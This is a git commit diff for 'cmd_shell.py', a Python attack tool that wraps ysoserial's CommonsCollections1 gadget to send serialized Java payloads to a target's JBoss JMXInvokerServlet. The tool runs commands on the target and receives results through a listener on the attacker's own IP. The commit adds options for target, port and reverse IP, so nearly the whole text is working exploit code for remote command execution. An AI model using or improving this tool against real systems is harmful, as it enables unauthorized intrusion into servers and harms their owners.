f14983c41976643e74279fb755ee662d9f2a91e6
9andrea1 <9andrea1@users.noreply.github.com>
2016-03-07 11:37:04 +0100

    Update cmd_shell.py

--- wget/cmd_shell.py
+++ wget/cmd_shell.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 import os, commands, requests, sys, base64, time, re
+from optparse import *
 
 from httpserver import listen # httpserver listener
 def getresponse():
@@ -41,7 +42,7 @@ def execute(cmd):
 	os.system("java -jar ../ysoserial-0.0.2-all.jar CommonsCollections1 '%s' > _cmd_"%cmd)
 	data = open('./_cmd_', 'rb').read()
 	os.system("rm _cmd_")
-	res = requests.post(url='http://'+target_ip+':8080/invoker/JMXInvokerServlet', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+	res = requests.post(url='http://'+target_ip+':'+target_port+'/invoker/JMXInvokerServlet', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
 
 # get cmd and exit
 def get_cmd():
@@ -53,9 +54,9 @@ def get_cmd():
 	work(cmd)
 
 # check if target is valid ip address
-def ValidTarget(target_ip):
-	pattern = re.compile("^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$")
-	if pattern.match(target_ip):
+def ValidIPAddress(IP):
+	pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
+	if pattern.match(IP):
 		return 1
 	else:
 		return 0
@@ -69,16 +70,31 @@ def delFiles():
 #		MAIN                    #
 #########################################
 
-if len(sys.argv)<2:
-	sys.exit("Usage: %s [target ip]"%sys.argv[0])
-else:
-	target_ip = sys.argv[1]
 
-if ValidTarget(target_ip):
+parser = OptionParser(usage='%prog [options]', description='Serialized objects command execution')
+parser.add_option('-t', '--target', type='string', dest="target", help='target ip')
+parser.add_option('-p', '--port', type='string', dest="port", help='target port')
+parser.add_option('-r', '--reverse', type='string', dest="reverse", help='cmd exec reverse ip (default my ip)')
+
+(options, args) = parser.parse_args()
+
+if options.target is None or options.port is None:
+	print "\n--target and --port option required\n"
+	parser.print_help()
+	print "\n"
+        sys.exit()
+
+if options.reverse is None:
 	my_ip = commands.getoutput('ifconfig eth0 | grep "inet\ addr" | cut -d: -f2 | cut -d" " -f1') # get my ip
+else:
+	my_ip = options.reverse
+
+target_ip = options.target
+target_port = options.port
+
+if ValidIPAddress(target_ip):
 	MakeScript()
 	while 1:
 		get_cmd()
 else:
 	print "Unexpected target format"
-
